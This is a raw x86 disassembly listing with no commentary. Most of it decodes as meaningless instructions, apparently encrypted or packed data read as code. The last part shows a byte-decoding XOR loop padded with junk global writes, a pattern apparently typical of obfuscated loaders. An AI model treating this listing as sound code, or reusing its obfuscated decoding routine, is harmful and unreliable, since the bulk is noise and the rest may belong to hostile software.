  41bce5:	dec    eax
  41bce6:	push   edi
  41bce7:	rol    BYTE PTR [ecx-0x2868ebdf],0xe0
  41bcee:	dec    esi
  41bcef:	cmp    al,0x45
  41bcf1:	in     eax,dx
  41bcf2:	scas   eax,DWORD PTR es:[edi]
  41bcf3:	jns    0x41bc9c
  41bcf5:	lods   al,BYTE PTR ds:[esi]
  41bcf6:	retf   
  41bcf7:	mov    cl,0x38
  41bcf9:	jmp    DWORD PTR [edx+0x236df865]
  41bcff:	add    BYTE PTR [edx],bl
  41bd01:	cli    
  41bd02:	mov    esi,0x4ab9366a
  41bd07:	popa   
  41bd08:	call   0x62e5:0x995b7eda
  41bd0f:	mov    edi,0x14995ac0
  41bd14:	lods   eax,DWORD PTR ds:[esi]
  41bd15:	ja     0x41bcd2
  41bd17:	aas    
  41bd18:	aam    0x9b
  41bd1a:	push   eax
  41bd1b:	and    al,0xdd
  41bd1d:	(bad)  [ebx]
  41bd1f:	xchg   ecx,eax
  41bd20:	and    BYTE PTR [ecx+0x67a6634e],ah
  41bd26:	sbb    DWORD PTR [esi+0x56],esp
  41bd29:	in     al,dx
  41bd2a:	jl     0x41bd7c
  41bd2c:	pop    eax
  41bd2d:	and    al,0xac
  41bd2f:	mov    eax,0x3f544358
  41bd34:	dec    esi
  41bd35:	jmp    0x16776cb1
  41bd3a:	in     al,dx
  41bd3b:	repz pop eax
  41bd3d:	pushf  
  41bd3e:	pop    esi
  41bd3f:	mov    al,0x23
  41bd41:	adc    DWORD PTR [ebx],esp
  41bd43:	push   edx
  41bd44:	(bad)  
  41bd45:	xor    bh,BYTE PTR [ebx-0x3e4b731f]
  41bd4b:	xchg   esp,eax
  41bd4c:	mov    ebp,0x28c445e5
  41bd51:	loopne 0x41bd4b
  41bd53:	aam    0x60
  41bd55:	dec    edx
  41bd56:	sub    dl,bl
  41bd58:	adc    eax,0xfeda9f24
  41bd5d:	xchg   ebp,eax
  41bd5e:	in     al,0x2a
  41bd60:	sbb    DWORD PTR ds:0xf3a12a1a,esi
  41bd66:	in     eax,dx
  41bd67:	mov    al,0xd4
  41bd69:	jg     0x41bd65
  41bd6b:	xchg   ebx,eax
  41bd6c:	cmp    al,0xfe
  41bd6e:	adc    BYTE PTR [eax-0x4d],ch
  41bd71:	mov    edi,0x26fba23e
  41bd76:	jle    0x41bdf7
  41bd78:	jmp    0x41bd48
  41bd7a:	stos   BYTE PTR es:[edi],al
  41bd7b:	out    dx,al
  41bd7c:	xchg   ecx,eax
  41bd7d:	iret   
  41bd7e:	inc    edi
  41bd7f:	jb     0x41bd89
  41bd81:	and    esp,eax
  41bd83:	(bad)  
  41bd84:	jmp    0x70fb:0xcbcb0ade
  41bd8b:	std    
  41bd8c:	out    0x7b,eax
  41bd8e:	cmp    edi,DWORD PTR [ecx-0x7b5d2430]
  41bd94:	inc    esp
  41bd95:	shl    dh,cl
  41bd97:	push   ss
  41bd98:	xchg   edx,eax
  41bd99:	fidiv  DWORD PTR [esi+eiz*8-0xe]
  41bd9d:	in     al,dx
  41bd9e:	sub    ah,al
  41bda0:	sysenter 
  41bda2:	jecxz  0x41bd35
  41bda4:	les    eax,FWORD PTR [ecx+0x5c]
  41bda7:	adc    esi,esp
  41bda9:	shl    al,cl
  41bdab:	cmp    DWORD PTR [eax-0x15],edx
  41bdae:	stos   BYTE PTR es:[edi],al
  41bdaf:	loopne 0x41bd5f
  41bdb1:	pop    ebx
  41bdb2:	jae    0x41bd73
  41bdb4:	jnp    0x41bd3e
  41bdb6:	repz inc ecx
  41bdb8:	mov    ecx,0xe9d36c07
  41bdbd:	retf   
  41bdbe:	bound  ecx,QWORD PTR [edx+0x518b2e19]
  41bdc4:	imul   edx,DWORD PTR [esi+ebx*8],0x69
  41bdc8:	mov    WORD PTR [edx+0x6f],cs
  41bdcb:	ins    BYTE PTR es:[edi],dx
  41bdcc:	std    
  41bdcd:	loope  0x41be2b
  41bdcf:	icebp  
  41bdd0:	jecxz  0x41be32
  41bdd2:	pop    esp
  41bdd3:	fsubrp st(7),st
  41bdd5:	mov    al,ds:0x5b255d7c
  41bdda:	call   0x6e41:0x3d87b2f
  41bde1:	push   DWORD PTR [ecx+0x3c21de6c]
  41bde7:	inc    edx
  41bde8:	dec    ebx
  41bde9:	ins    DWORD PTR es:[edi],dx
  41bdea:	fnsave ds:0x9a211763
  41bdf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bdf1:	add    eax,0x3b88203d
  41bdf6:	cld    
  41bdf7:	xor    DWORD PTR [edi-0x65],edx
  41bdfa:	or     al,0x36
  41bdfc:	in     eax,dx
  41bdfd:	(bad)  
  41bdfe:	jge    0x41bdf5
  41be00:	dec    ebx
  41be01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be02:	aas    
  41be03:	cwde   
  41be04:	rcr    DWORD PTR ss:0x5438ef02,1
  41be0b:	mov    WORD PTR [esi+esi*1+0x62],cs
  41be0f:	pop    edx
  41be10:	push   0xfffffffe
  41be12:	mov    dl,0xdb
  41be14:	dec    eax
  41be15:	mov    eax,0xdf22defb
  41be1a:	sub    ch,BYTE PTR [ecx+0x13256409]
  41be20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be21:	or     BYTE PTR [esi-0x46e39513],bl
  41be27:	or     eax,0x4ce36b87
  41be2c:	adc    al,bl
  41be2e:	leave  
  41be2f:	adc    al,0xed
  41be31:	cmp    al,0x8
  41be33:	push   esi
  41be34:	pop    ds
  41be35:	icebp  
  41be36:	xlat   BYTE PTR ds:[ebx]
  41be37:	or     edx,ecx
  41be39:	call   0xed0b6d48
  41be3e:	push   ss
  41be3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be40:	aad    0xe6
  41be42:	push   edi
  41be43:	call   0xaf94e642
  41be48:	mov    edi,0xf9184e9e
  41be4d:	add    eax,0xf343628d
  41be53:	xor    ecx,DWORD PTR [edi]
  41be55:	mov    eax,0x5169ecf7
  41be5a:	dec    edi
  41be5b:	pop    ecx
  41be5c:	je     0x41bddf
  41be5e:	sbb    ecx,eax
  41be60:	push   ds
  41be61:	outs   dx,BYTE PTR ds:[esi]
  41be62:	cmp    BYTE PTR [edx+0x5fae7faf],dl
  41be68:	bound  edi,QWORD PTR [esi+0x4dbf2ffa]
  41be6e:	(bad)  [esi-0x5b9a8d37]
  41be74:	cmp    eax,0xfa0ef435
  41be79:	lds    esp,FWORD PTR [edi+0xb]
  41be7c:	adc    al,al
  41be7e:	pop    esp
  41be7f:	out    dx,eax
  41be80:	aaa    
  41be81:	std    
  41be82:	lods   eax,DWORD PTR ds:[esi]
  41be83:	or     ebp,edx
  41be85:	xchg   ebp,eax
  41be86:	fmul   DWORD PTR [edi+0x48]
  41be89:	pop    edi
  41be8a:	mov    ah,0x8e
  41be8c:	neg    BYTE PTR [eax+0x30]
  41be8f:	mov    ebp,DWORD PTR [ebx]
  41be91:	mov    ds:0xde724833,eax
  41be96:	add    ch,BYTE PTR [ebp+0x37]
  41be99:	jmp    0x4adb:0x104260bc
  41bea0:	inc    edx
  41bea1:	adc    DWORD PTR [edi+0x450c9d56],ebp
  41bea7:	add    edx,DWORD PTR [eax]
  41bea9:	mov    ?,WORD PTR [edi]
  41beab:	xchg   edi,eax
  41beac:	mov    edi,0x3bdb7413
  41beb1:	and    ebx,DWORD PTR [eax]
  41beb3:	mov    cl,BYTE PTR [edi+0x7b]
  41beb6:	cli    
  41beb7:	mov    ch,0x69
  41beb9:	fsubr  QWORD PTR [edi-0x1a9bf244]
  41bebf:	repz add al,0xf9
  41bec2:	imul   ecx,DWORD PTR [eax+eiz*8-0x75],0xaddb34d3
  41beca:	push   eax
  41becb:	xchg   esi,eax
  41becc:	repnz mov al,ds:0x56cbeb40
  41bed2:	push   ecx
  41bed3:	(bad)  
  41bed4:	imul   edi,DWORD PTR [ebp-0x78],0xdbc240d
  41bedb:	ins    BYTE PTR es:[edi],dx
  41bedc:	addr16 push edi
  41bede:	dec    ecx
  41bedf:	inc    edx
  41bee0:	mov    al,0x6e
  41bee2:	sbb    ch,BYTE PTR gs:[eax+0x3159fff7]
  41bee9:	inc    ebx
  41beea:	repnz lods eax,DWORD PTR ds:[esi]
  41beec:	push   edi
  41beed:	xor    DWORD PTR [edx],ecx
  41beef:	mov    al,ds:0xa22ef7f0
  41bef4:	ja     0x41bef7
  41bef6:	sub    BYTE PTR [esi-0x798afadd],cl
  41befc:	jnp    0x41bf27
  41befe:	aam    0xc9
  41bf00:	je     0x41bf0b
  41bf02:	loop   0x41bec9
  41bf04:	fwait
  41bf05:	shr    BYTE PTR [eax],cl
  41bf07:	adc    eax,esp
  41bf09:	enter  0xab9e,0xc9
  41bf0d:	mov    esp,0xe534f29c
  41bf12:	mov    ch,0xcf
  41bf14:	call   0x97e2:0x28ffb149
  41bf1b:	jp     0x41bf7d
  41bf1d:	and    DWORD PTR [esi-0x1664d46e],ebp
  41bf23:	inc    esi
  41bf24:	xchg   ebp,eax
  41bf25:	xchg   ebx,eax
  41bf26:	imul   DWORD PTR [esp+edi*2-0x77]
  41bf2a:	mov    ch,0xd8
  41bf2c:	xchg   ecx,eax
  41bf2d:	cmp    ah,BYTE PTR [edi-0xb]
  41bf30:	std    
  41bf31:	sbb    BYTE PTR [edi+0x4671ad48],cl
  41bf37:	lahf   
  41bf38:	and    esp,edx
  41bf3a:	inc    edx
  41bf3b:	push   eax
  41bf3c:	ret    
  41bf3d:	pop    ss
  41bf3e:	adc    ebx,DWORD PTR [edi-0x19]
  41bf41:	mov    bl,bl
  41bf43:	int    0x8a
  41bf45:	mov    bh,0x46
  41bf47:	mov    edx,0xfc59b29d
  41bf4c:	dec    esp
  41bf4d:	mov    esp,ecx
  41bf4f:	pop    eax
  41bf50:	(bad)  
  41bf51:	sbb    al,0x84
  41bf53:	popf   
  41bf54:	pop    esp
  41bf55:	outs   dx,BYTE PTR ds:[esi]
  41bf56:	pop    ss
  41bf57:	mov    esp,0x8b51ab2b
  41bf5c:	pop    esp
  41bf5d:	add    eax,0x4ce7a416
  41bf62:	frstor [ebp-0x2f4f38c0]
  41bf68:	or     cl,BYTE PTR [edi+0x29893663]
  41bf6e:	stos   DWORD PTR es:[edi],eax
  41bf6f:	stos   BYTE PTR es:[edi],al
  41bf70:	sub    DWORD PTR [edi-0xb],ecx
  41bf73:	adc    DWORD PTR [eax+0x6a],esi
  41bf76:	cmp    al,0xf1
  41bf78:	fs call 0xb86f:0x1b6bd4da
  41bf80:	sti    
  41bf81:	in     eax,dx
  41bf82:	and    DWORD PTR [ebp+0x31],ebp
  41bf85:	cwde   
  41bf86:	fist   DWORD PTR [ebx-0x19]
  41bf89:	jne    0x41bff5
  41bf8b:	mov    ah,BYTE PTR [ebp+0x4a3f7e0f]
  41bf91:	sbb    eax,0x3bbb299b
  41bf96:	fisubr WORD PTR [eax]
  41bf98:	jnp    0x41bfe7
  41bf9a:	push   esp
  41bf9b:	ss call 0xa685:0xf58b1940
  41bfa3:	adc    ecx,edi
  41bfa5:	repz lock mov edx,0x506384f0
  41bfac:	ret    0x76e9
  41bfaf:	cs sub eax,0x67bc09e4
  41bfb5:	jb     0x41bffd
  41bfb7:	cmp    bh,al
  41bfb9:	sbb    eax,0x7e978a48
  41bfbe:	xor    DWORD PTR [ecx],0xffffff83
  41bfc1:	lahf   
  41bfc2:	mov    esp,0x649cc295
  41bfc7:	lahf   
  41bfc8:	and    esp,ebp
  41bfca:	not    esp
  41bfcc:	data16 adc ch,dh
  41bfcf:	shl    dh,0xd7
  41bfd2:	and    ecx,DWORD PTR [ebp+0x10]
  41bfd5:	nop
  41bfd6:	mov    bl,0x1c
  41bfd8:	dec    esp
  41bfd9:	push   edi
  41bfda:	inc    ebp
  41bfdb:	jbe    0x41bfd1
  41bfdd:	loop   0x41bfde
  41bfdf:	rol    DWORD PTR [ebx],cl
  41bfe1:	inc    edi
  41bfe2:	fs mov ah,0x8a
  41bfe5:	jmp    0x5358c144
  41bfea:	ins    DWORD PTR es:[edi],dx
  41bfeb:	adc    eax,0x552274
  41bff0:	ins    DWORD PTR es:[edi],dx
  41bff1:	adc    ch,BYTE PTR [eax]
  41bff3:	push   edx
  41bff4:	test   BYTE PTR [esi],al
  41bff6:	dec    esp
  41bff7:	cbw    
  41bff9:	mov    al,ds:0x8f1d45a8
  41bffe:	cs cmp bl,dh
  41c001:	push   cs
  41c002:	mov    al,ds:0xbb6b4c13
  41c007:	mov    ecx,0xcbec6124
  41c00c:	mov    ebx,0x511ec82e
  41c011:	(bad)  
  41c012:	xchg   edx,eax
  41c013:	jbe    0x41bff1
  41c015:	pop    es
  41c016:	repz pusha 
  41c018:	mul    BYTE PTR [edx+0x82ac38d]
  41c01e:	cdq    
  41c01f:	clc    
  41c020:	and    BYTE PTR [ecx+0x6d],bl
  41c023:	xor    eax,0xae30962d
  41c028:	and    esi,edx
  41c02a:	or     al,0xcc
  41c02c:	inc    eax
  41c02d:	and    eax,0xe6e10c45
  41c032:	imul   ecx,DWORD PTR [ebp+0x6a],0xffffffdd
  41c036:	mov    ecx,0x72bfd51f
  41c03b:	add    DWORD PTR [ebx+0x4e],ecx
  41c03e:	ds inc ecx
  41c040:	pusha  
  41c041:	add    eax,0x1f1ab3a8
  41c046:	fistp  WORD PTR [edi+0x47]
  41c049:	mov    esp,0xba1d5992
  41c04e:	in     al,0xc5
  41c050:	dec    esi
  41c051:	or     ah,bh
  41c053:	arpl   WORD PTR [ebx-0x5f45eec3],dx
  41c059:	ins    BYTE PTR es:[edi],dx
  41c05a:	dec    edi
  41c05b:	imul   esi,DWORD PTR [ecx],0xffffffc0
  41c05e:	xchg   DWORD PTR ds:0x18d58a38,edx
  41c064:	pop    es
  41c065:	jmp    0x41c08b
  41c067:	cmp    esi,DWORD PTR [esi-0x29]
  41c06a:	jae    0x41c094
  41c06c:	cmc    
  41c06d:	loope  0x41c075
  41c06f:	mov    BYTE PTR [ecx+0x43864484],bh
  41c075:	dec    esp
  41c076:	test   ch,0x9f
  41c079:	sub    bh,BYTE PTR [edi+ecx*1+0x35d806ce]
  41c080:	inc    edx
  41c081:	bound  ebx,QWORD PTR [edi]
  41c083:	and    al,0x6c
  41c085:	jmp    0x41c08c
  41c087:	xchg   esp,eax
  41c088:	mov    BYTE PTR [ecx+0x19e34c18],dh
  41c08e:	andnps xmm2,XMMWORD PTR [esi+edi*2-0x7f]
  41c093:	xor    al,0xdc
  41c095:	aaa    
  41c096:	ins    BYTE PTR es:[edi],dx
  41c097:	pop    edx
  41c098:	sbb    eax,0x9d0b3ebb
  41c09d:	into   
  41c09e:	not    DWORD PTR [edi+0x2a08d3ea]
  41c0a4:	iret   
  41c0a5:	or     eax,0x6ee14c3f
  41c0aa:	push   edx
  41c0ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0ac:	pop    eax
  41c0ad:	loopne 0x41c0e8
  41c0af:	test   BYTE PTR [ebx+0x43],0x40
  41c0b3:	mov    eax,0xbb47d40b
  41c0b8:	sbb    DWORD PTR [edx+0x26f16893],eax
  41c0be:	fisttp DWORD PTR [ebx]
  41c0c0:	mov    cl,0x6c
  41c0c2:	icebp  
  41c0c3:	inc    ebp
  41c0c4:	addr16 retf 
  41c0c6:	gs mov esp,0x31f76d9c
  41c0cc:	adc    dh,BYTE PTR [eax+edi*4-0x2866577b]
  41c0d3:	sub    eax,0x5375eaa
  41c0d8:	or     al,0x75
  41c0da:	fistp  WORD PTR gs:[eax]
  41c0dd:	retf   
  41c0de:	sahf   
  41c0df:	and    DWORD PTR [edx],eax
  41c0e1:	xchg   ebx,eax
  41c0e2:	pop    es
  41c0e3:	scas   al,BYTE PTR es:[edi]
  41c0e4:	int3   
  41c0e5:	rcr    esi,cl
  41c0e7:	adc    ah,BYTE PTR [edi*8+0x45218a89]
  41c0ee:	and    eax,0x4ca61131
  41c0f3:	jle    0x41c098
  41c0f5:	inc    eax
  41c0f6:	mov    esp,?
  41c0f8:	ins    DWORD PTR es:[edi],dx
  41c0f9:	mov    edx,0x9e5924d4
  41c0fe:	clc    
  41c0ff:	cmp    al,0xb4
  41c101:	cmc    
  41c102:	mov    ds:0x88b3894,eax
  41c107:	loopne 0x41c187
  41c109:	int3   
  41c10a:	xor    ebx,edx
  41c10c:	jb     0x41c12a
  41c10e:	add    DWORD PTR [edx],esp
  41c110:	inc    esp
  41c111:	push   edx
  41c112:	pop    ebx
  41c113:	pop    ds
  41c114:	sar    DWORD PTR [eax],0xd8
  41c117:	mov    dl,0xb8
  41c119:	jbe    0x41c160
  41c11b:	mov    ah,BYTE PTR [esi]
  41c11d:	shl    DWORD PTR [edi+0xa8ac00c],cl
  41c123:	xlat   BYTE PTR ds:[ebx]
  41c124:	xor    al,0xdd
  41c126:	cmp    al,0x33
  41c128:	icebp  
  41c129:	xor    esp,edx
  41c12b:	ss sub al,0xa4
  41c12e:	push   edi
  41c12f:	repnz lods al,BYTE PTR ds:[esi]
  41c131:	push   edi
  41c132:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c133:	add    al,BYTE PTR [edi+0x17]
  41c136:	dec    ecx
  41c137:	inc    ecx
  41c138:	xor    al,0x0
  41c13a:	inc    esi
  41c13b:	or     dl,BYTE PTR [ecx]
  41c13d:	in     eax,dx
  41c13e:	xchg   edx,eax
  41c13f:	mov    ecx,0x1cab52ed
  41c144:	mov    WORD PTR [edi+0x4ad701bd],fs
  41c14a:	test   dl,dl
  41c14c:	pop    esp
  41c14d:	or     dh,BYTE PTR [edx-0x6c]
  41c150:	dec    eax
  41c151:	leave  
  41c152:	push   0x47
  41c154:	popa   
  41c155:	or     ecx,DWORD PTR [esp+edx*1]
  41c158:	jnp    0x41c138
  41c15a:	gs push edi
  41c15c:	and    eax,0x4294e0bf
  41c161:	scas   eax,DWORD PTR es:[edi]
  41c162:	inc    eax
  41c163:	sahf   
  41c164:	jbe    0x41c1a2
  41c166:	cdq    
  41c167:	sahf   
  41c168:	push   edx
  41c169:	scas   eax,DWORD PTR es:[edi]
  41c16a:	stc    
  41c16b:	inc    ecx
  41c16c:	(bad)  
  41c16d:	pop    ss
  41c16e:	cld    
  41c16f:	out    dx,eax
  41c170:	shl    DWORD PTR ds:0x5d74b0e4,1
  41c177:	fld    DWORD PTR [ebp+0x1f597bdf]
  41c17d:	push   edx
  41c17e:	fld    DWORD PTR [edx]
  41c180:	enter  0x793b,0xe6
  41c184:	cld    
  41c185:	jae    0x41c1d9
  41c187:	mov    al,ds:0x8b426bb4
  41c18c:	retf   0x7099
  41c18f:	jbe    0x41c13d
  41c191:	imul   ecx,DWORD PTR [eax],0x32381e6e
  41c197:	pusha  
  41c198:	stos   DWORD PTR es:[edi],eax
  41c199:	cmp    al,0xa2
  41c19b:	fcom   QWORD PTR fs:[eax-0x70f23b7]
  41c1a2:	jb     0x41c1d1
  41c1a4:	loop   0x41c21d
  41c1a6:	mov    eax,ds:0x7526683b
  41c1ab:	pop    ebx
  41c1ac:	ror    BYTE PTR [ebx+esi*4-0x6],1
  41c1b0:	mov    dh,0x7f
  41c1b2:	scas   al,BYTE PTR es:[edi]
  41c1b3:	xor    BYTE PTR [eax],dl
  41c1b5:	jecxz  0x41c199
  41c1b7:	adc    eax,0xf35755cf
  41c1bc:	ins    BYTE PTR es:[edi],dx
  41c1bd:	test   al,0xf7
  41c1bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1c0:	xchg   ebx,eax
  41c1c1:	jno    0x41c1a3
  41c1c3:	mov    ah,0x64
  41c1c5:	dec    DWORD PTR [eax-0x55683ad4]
  41c1cb:	jo     0x41c1ae
  41c1cd:	sbb    edi,DWORD PTR [ebx]
  41c1cf:	mov    esp,0xdab37838
  41c1d4:	mov    eax,ds:0x9c50ba79
  41c1d9:	jo     0x41c18b
  41c1db:	out    dx,al
  41c1dc:	stc    
  41c1dd:	out    0xc6,eax
  41c1df:	aad    0x86
  41c1e1:	iret   
  41c1e2:	jnp    0x41c1ea
  41c1e4:	dec    eax
  41c1e5:	fadd   DWORD PTR [edx+0x4d305e85]
  41c1eb:	xor    al,0x18
  41c1ed:	cwde   
  41c1ee:	or     al,0x1f
  41c1f0:	xchg   esp,eax
  41c1f1:	jae    0x41c1bd
  41c1f3:	cmp    DWORD PTR [ecx],ebx
  41c1f5:	outs   dx,DWORD PTR ds:[esi]
  41c1f6:	push   ecx
  41c1f7:	loop   0x41c232
  41c1f9:	push   ebp
  41c1fa:	push   esp
  41c1fb:	das    
  41c1fc:	push   ss
  41c1fd:	and    DWORD PTR cs:[edx-0x77c392d],ebp
  41c204:	test   DWORD PTR [esp+eax*1],0x3b262191
  41c20b:	xor    ch,ah
  41c20d:	ret    
  41c20e:	mov    al,ds:0xf208633e
  41c213:	fdivr  QWORD PTR ds:0x2b0d4b34
  41c219:	jbe    0x41c252
  41c21b:	inc    eax
  41c21c:	adc    DWORD PTR [ebp+0x227a9e46],ecx
  41c222:	jb     0x41c25e
  41c224:	popf   
  41c225:	stos   BYTE PTR es:[edi],al
  41c226:	enter  0x8cfb,0xca
  41c22a:	stos   DWORD PTR es:[edi],eax
  41c22b:	dec    edi
  41c22c:	jbe    0x41c247
  41c22e:	sbb    ecx,DWORD PTR [esi+0x24dafa72]
  41c234:	add    cl,BYTE PTR [ebp-0x12]
  41c237:	jl     0x41c297
  41c239:	push   0xcf2819e3
  41c23e:	and    eax,0x15a571a2
  41c243:	retf   0x9e73
  41c246:	and    esp,ebp
  41c248:	xor    ecx,DWORD PTR [edi-0x5a]
  41c24b:	out    0xfc,al
  41c24d:	dec    esp
  41c24e:	inc    esp
  41c24f:	jnp    0x41c254
  41c251:	xchg   ebp,eax
  41c252:	dec    eax
  41c253:	xchg   ecx,eax
  41c254:	jns    0x41c295
  41c256:	test   eax,0x874e41fd
  41c25b:	lock dec ebp
  41c25d:	pop    ds
  41c25e:	test   DWORD PTR [edx+edi*1-0x1f],ebx
  41c262:	popa   
  41c263:	mov    al,ds:0x647bdd2d
  41c268:	cmc    
  41c269:	jbe    0x41c2ac
  41c26b:	cpuid  
  41c26d:	jg     0x41c2c3
  41c26f:	push   ebp
  41c270:	ds pop eax
  41c272:	lock and eax,0x234c087d
  41c278:	mov    al,ds:0x7c13da14
  41c27d:	ret    
  41c27e:	outs   dx,BYTE PTR ds:[esi]
  41c27f:	mov    al,0xf2
  41c281:	imul   ecx,DWORD PTR [ebx],0xffffffd9
  41c284:	fmulp  st(0),st
  41c286:	lds    ebp,FWORD PTR [edi]
  41c288:	lea    eax,[ebp-0xb]
  41c28b:	jecxz  0x41c22f
  41c28d:	xor    al,0xf7
  41c28f:	lods   eax,DWORD PTR ds:[esi]
  41c290:	jmp    0x41c2b6
  41c292:	std    
  41c293:	add    al,0x23
  41c295:	nop
  41c296:	push   edi
  41c297:	pop    ecx
  41c298:	adc    ebx,DWORD PTR [ebp+ecx*8-0x5d5bdfe7]
  41c29f:	and    DWORD PTR [ebp-0x6a],0x1c1af846
  41c2a6:	cmp    eax,0xdb30dcdb
  41c2ab:	out    0x80,al
  41c2ad:	dec    eax
  41c2ae:	ins    DWORD PTR es:[edi],dx
  41c2af:	add    bl,BYTE PTR [eax]
  41c2b1:	shr    DWORD PTR [esi+0xc054490],cl
  41c2b7:	sub    DWORD PTR [ecx],edx
  41c2b9:	dec    esp
  41c2ba:	xor    al,BYTE PTR [ebp-0x447fff6f]
  41c2c0:	cld    
  41c2c1:	stc    
  41c2c2:	loop   0x41c272
  41c2c4:	push   0xe
  41c2c6:	dec    eax
  41c2c7:	sub    al,bh
  41c2c9:	xchg   ebx,eax
  41c2ca:	ficom  WORD PTR [edi+0x15b4d890]
  41c2d0:	imul   eax,DWORD PTR [eax+edx*2+0x1f7a3fcc],0xffffffc7
  41c2d8:	inc    esi
  41c2d9:	mov    WORD PTR [edi+0x57],gs
  41c2dc:	cmp    DWORD PTR [ecx-0x67],ecx
  41c2df:	mov    esi,0xab862e10
  41c2e4:	(bad)  
  41c2e5:	in     al,dx
  41c2e6:	aad    0x4d
  41c2e8:	xchg   DWORD PTR [ebx+0x19],ebx
  41c2eb:	pop    ds
  41c2ec:	pushf  
  41c2ed:	dec    sp
  41c2ef:	pop    eax
  41c2f0:	mov    WORD PTR [esp+ebp*8-0x58],ss
  41c2f4:	cmp    al,BYTE PTR [eax+0x2cdb6716]
  41c2fa:	icebp  
  41c2fb:	scas   eax,DWORD PTR es:[edi]
  41c2fc:	jo     0x41c29d
  41c2fe:	out    0xe9,eax
  41c300:	mov    cl,0xc6
  41c302:	(bad)  
  41c303:	call   0x4068f963
  41c308:	mov    esi,DWORD PTR [esi]
  41c30a:	xchg   esi,eax
  41c30b:	ret    0xa7fe
  41c30e:	jmp    0x986:0x641a8eb5
  41c315:	cmp    DWORD PTR gs:[ebp+0x5c],ebp
  41c319:	adc    eax,DWORD PTR [edx]
  41c31b:	xor    BYTE PTR [ebx-0x53],cl
  41c31e:	mov    bl,0x4c
  41c320:	push   ebx
  41c321:	and    ch,0x53
  41c324:	mov    edi,0xc67727d0
  41c329:	hlt    
  41c32a:	jg     0x41c2f0
  41c32c:	xor    eax,DWORD PTR [esp+0x5b9aa4ac]
  41c333:	xchg   ecx,eax
  41c334:	sub    eax,0xfcb3513e
  41c339:	gs mov bh,0xb5
  41c33c:	jp     0x41c2cc
  41c33e:	in     al,dx
  41c33f:	(bad)  
  41c340:	xchg   esi,eax
  41c341:	dec    BYTE PTR [edx]
  41c343:	inc    ebp
  41c344:	in     al,dx
  41c345:	enter  0x76a1,0xea
  41c349:	jns    0x41c2fa
  41c34b:	data16 fiadd DWORD PTR es:[ebp-0x7]
  41c350:	adc    esp,DWORD PTR [ebx]
  41c352:	jle    0x41c3a5
  41c354:	jg     0x41c3bd
  41c356:	xor    BYTE PTR [esi-0xb],cl
  41c359:	div    BYTE PTR [ebx-0x2f7746fe]
  41c35f:	imul   ecx,ebx,0x5a
  41c362:	retf   
  41c363:	pop    edi
  41c364:	call   0x38bd:0x96f22b40
  41c36b:	adc    DWORD PTR [edx],ecx
  41c36d:	push   ss
  41c36e:	in     eax,0x7f
  41c370:	jns    0x41c334
  41c372:	shl    cl,0xbf
  41c375:	push   ebx
  41c376:	pop    ecx
  41c377:	fmul   QWORD PTR [edx-0x5bde29c1]
  41c37d:	push   ebp
  41c37e:	pop    ecx
  41c37f:	in     eax,dx
  41c380:	xor    eax,DWORD PTR [ecx]
  41c382:	push   es
  41c383:	neg    cl
  41c385:	mov    DWORD PTR [ebx+0x2e],ebx
  41c388:	aad    0x57
  41c38a:	bnd jno 0x41c342
  41c38d:	and    esp,0x4118e059
  41c393:	dec    edi
  41c394:	ds popa 
  41c396:	retf   0x8d6c
  41c399:	lea    edx,[ebx+0x44]
  41c39c:	or     ebp,edi
  41c39e:	pushf  
  41c39f:	cmp    eax,0x312cc538
  41c3a4:	int    0xe8
  41c3a6:	into   
  41c3a7:	pop    ebp
  41c3a8:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41c3aa:	push   esp
  41c3ab:	add    DWORD PTR [edi+ebp*8],edx
  41c3ae:	pop    ecx
  41c3af:	ds jae 0x41c3b9
  41c3b2:	(bad)  
  41c3b4:	xchg   esp,eax
  41c3b5:	out    0x6,eax
  41c3b7:	mov    ds:0xab2b5c38,al
  41c3bc:	mov    edi,0xe7723802
  41c3c1:	inc    eax
  41c3c2:	sbb    cl,BYTE PTR [esp+ebx*8+0x4a]
  41c3c6:	add    eax,0x85b9b3be
  41c3cb:	mov    al,BYTE PTR [eax]
  41c3cd:	add    BYTE PTR [ecx+0x42c00c1d],al
  41c3d3:	add    BYTE PTR [eax+eiz*4],bl
  41c3d6:	inc    edx
  41c3d7:	add    BYTE PTR [esi+0x33],ah
  41c3da:	dec    esp
  41c3db:	xchg   edi,eax
  41c3dc:	add    al,BYTE PTR [ecx+0x42800425]
  41c3e2:	add    BYTE PTR [edx+0x29],bh
  41c3e5:	add    BYTE PTR [eax],al
  41c3e7:	mov    edi,0x3b4b
  41c3ec:	add    DWORD PTR ds:0x42901c,0x4e21
  41c3f6:	add    cx,di
  41c3f9:	and    DWORD PTR ds:0x428024,0x9b5
  41c403:	movzx  ecx,cx
  41c406:	not    DWORD PTR ds:0x42801c
  41c40c:	mov    DWORD PTR [ebp-0x10],ecx
  41c40f:	and    ecx,DWORD PTR ds:0x42a01c
  41c415:	mov    ecx,DWORD PTR [ebp+0x8]
  41c418:	movzx  ecx,WORD PTR [ecx+edx*4]
  41c41c:	xor    ecx,0x8a85
  41c422:	add    ecx,edi
  41c424:	mov    edi,0x7b07
  41c429:	mov    edi,DWORD PTR [ebp-0x10]
  41c42c:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  41c433:	inc    edx
  41c434:	mov    DWORD PTR ds:0x428024,0x7111
  41c43e:	mov    ecx,DWORD PTR [ebp-0x18]
  41c441:	mov    DWORD PTR ds:0x42a014,0x7e65
  41c44b:	cmp    edx,ecx
  41c44d:	mov    DWORD PTR ds:0x42c01c,0x291f
  41c457:	jne    0x41a04b
  41c45d:	mov    ecx,DWORD PTR [ebp-0x14]
  41c460:	add    DWORD PTR ds:0x42c008,edi
  41c466:	mov    edx,DWORD PTR [ebp+0x10]
  41c469:	xor    ecx,eax
  41c46b:	add    DWORD PTR ds:0x42a014,0x777
  41c475:	add    ecx,esi
  41c477:	mov    DWORD PTR [edx],ecx
  41c479:	or     DWORD PTR ds:0x42c014,edi
  41c47f:	mov    ecx,DWORD PTR [ebp-0x14]
  41c482:	xor    ecx,eax
  41c484:	add    ecx,esi
  41c486:	mov    DWORD PTR [ebp-0x20],ecx
  41c489:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
